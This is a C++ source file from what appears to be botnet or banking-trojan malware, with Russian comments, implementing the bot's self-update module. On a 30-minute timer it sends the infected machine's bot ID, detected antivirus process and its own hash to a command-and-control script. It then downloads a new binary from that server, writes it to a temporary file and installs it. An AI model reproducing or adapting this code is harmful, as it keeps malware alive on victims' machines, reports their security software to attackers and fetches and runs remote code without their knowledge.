//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotAutoUpdate.h"
#include "BotCore.h"
#include "md5.h"
#include "BotDef.h"
//---------------------------------------------------------------------------



#include "BotDebug.h"

namespace BotAutoUpdate
{
    #include "DbgTemplates.h"
}

#define BAUDBG  BotAutoUpdate::DBGOutMessage<>



//****************************************************************************
//                                  TBotUpdater
//****************************************************************************
TBotUpdater::TBotUpdater()
	: TBotThread(false)
{
//	Interval = 5 * 60 * 1000;
//	Interval = 20 * 1000;
	Interval = 30 * 60 * 1000;

	Start();
}
//----------------------------------------------------------

void TBotUpdater::DoExecute()
{
	// Запускаем цикл автоматического обновления бота
	pSleep(4000);
	while (!Terminated())
	{
		DWORD UpdateInterval = Interval;

		Update(UpdateInterval);

		pSleep(UpdateInterval);
	}

}
//----------------------------------------------------------


//----------------------------------------------------
//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
//----------------------------------------------------
string BotExeMD5()
{
	string FileName = BOT::GetBotFullExeName();

	string Result = MD5StrFromFileA(FileName.t_str());

	if (Result.IsEmpty())
	{
		Result.SetLength(32);
		m_memset(Result.t_str(), '0', 32);
    }
	return Result;
}


void TBotUpdater::Update(DWORD &UpdateInterval)
{
	// Функция выполняет автоматическое обновление бота
	BAUDBG("АвтоОбновление", "Запрашиваем новую версию бота");
	// Интервал обновления в случае ошибки
	const static DWORD ErrorInterval = 60000;

	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
	if (!URL)
	{
		BAUDBG("АвтоОбновление", "Сервер не доступен");
		UpdateInterval = ErrorInterval;
		return;
	}

	// Выполняем запрос
	string UID = GenerateBotID2();
	string AV  = GetAntiVirusProcessName();
	string MD5 = BotExeMD5();


	TBotStrings Fields;

	Fields.AddValue(HTTP_FIELD_UID,     UID);
	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
	Fields.AddValue(HTTP_FIELD_MD5,     MD5);

	BAUDBG("АвтоОбновление", "Параметры запроса: \r\n UID: %s\r\n AV: %s\r\n MD5: %s", UID.t_str(), AV.t_str(), MD5.t_str());

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif


	string Buf;

	HTTP.CheckOkCode = false;
    bool Done = HTTP.Post(URL, &Fields, Buf);

	BAUDBG("АвтоОбновление", "Ответ сервера: Code: %d; Data:\r\n%s", HTTP.Response.Code, Buf.t_str());

	if (Done && HTTP.Response.Code == 403 && !Buf.IsEmpty())
	{
		// Выполняем обновление
		TBotStrings Values;
		Values.SetText(Buf);

		string FileName = Values.GetValue("file_name");
		MD5 = Values.GetValue("md5");


		if (!FileName.IsEmpty() && !MD5.IsEmpty())
		{
			TURL URL;

			URL.Host     = HTTP.Request.Host;
			URL.Path     = "cfg";
			URL.Document = FileName;

			string FileURL = URL.URL();


			// Загружаем и устанавливаем новую версию
			DownloadAndSetup(FileURL, MD5);
        }
    }

	STR::Free(URL);

}
//----------------------------------------------------------

void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &MD5)
{
	// Функция загржает и устанавливает новую версию бота
	BAUDBG("АвтоОбновление", "Обнаружена новая версия. Загружаем");
	TBotMemoryStream Data;
	THTTP HTTP;

	if (HTTP.Get(FileURL.t_str(), &Data))
	{
		// Файл загружен, проверяем md5 хэш
		string Hash = MD5StrFromBuf(Data.Memory(), Data.Size());
		BAUDBG("АвтоОбновление", "Загружено %d байт. md5 %s", Data.Size(), Hash.t_str());

		if (Hash != MD5)
		{
			BAUDBG("АвтоОбновление", "Ошибка загрузки билда. МД5 не совпадают");
			File::WriteBufferA("c:\\err_bl.exe", Data.Memory(), Data.Size());
        	return;
		}

		{
			// Файл успешно скачан, устанавливаем его
			PCHAR Name = File::GetTempNameA();

			File::WriteBufferA(Name, Data.Memory(), Data.Size());
			BAUDBG("АвтоОбновление", "Новая версия бота успешно загружена. Запускаем установку.");

			// Сохраняем текущие настройки
			BOT::SaveSettings(true, true, true);

			// Устанавливаем новую версию
			if (BOT::MakeUpdate(Name, false))
			{
            	BAUDBG("АвтоОбновление", "Новая версия бота успешно установлена.");
            }

			STR::Free(Name);
        }
	}
}
//----------------------------------------------------------



//--------------------------------------------------
//  StartAutoUpdate - функция запускает
//  автоматическое обновление бота
//--------------------------------------------------
void StartAutoUpdate()
{
    new TBotUpdater();
}
